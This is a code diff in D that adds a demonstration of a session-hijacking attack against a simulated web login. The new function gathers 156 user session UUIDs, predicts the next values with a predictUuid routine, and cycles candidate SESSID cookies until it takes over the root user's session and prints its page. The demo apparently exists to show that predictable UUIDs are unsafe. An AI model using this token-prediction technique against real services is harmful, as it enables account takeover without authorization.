@@ -97,6 +97,54 @@ void testPredictUuid() {
     writeln(candidates.canFind(uuidLst[156]) ? "UUID was found!" : "Not found");
 }
 
+void webDemoPrediction() {
+    auto web = WebInterface();
+    WebRequest  request;
+    WebResponse response;
+    CookieJar   cookies;
+
+    UUID[] uuidLst;
+
+    writeln("Gathering user cookies...");
+
+    foreach (_ ; 0..156) {
+        request = WebRequest("username=user&password=userpassword", null);
+        response = web.postLogin(request);
+        assert(response.code == 200);
+        cookies = response.cookies;
+
+        uuidLst ~= UUID(cookies["SESSID"]);
+    }
+
+    writeln("Building candidate list...");
+
+    auto candidates = predictUuid(uuidLst, 0).array;
+
+    writeln("Root user connects...");
+
+    request = WebRequest("username=root&password=rootpassword", null);
+    response = web.postLogin(request);
+    assert(response.code == 200);
+    cookies = response.cookies;
+
+    auto rootSessid = UUID(cookies["SESSID"]);
+
+    writeln();
+
+    foreach (i,candidate ; candidates) {
+        cookies["SESSID"] = candidate.to!string;
+        request  = WebRequest("", cookies);
+        response = web.getAccountPage(request);
+
+        if (response.content != "Unauthorized") {
+            writeln("We found it! ", i, " tries were required");
+
+            writeln(candidate);
+            writeln(response.content);
+        }
+    }
+}
+
 void main(string[] argv) {
-    testPredictUuid();
+    webDemoPrediction();
 }
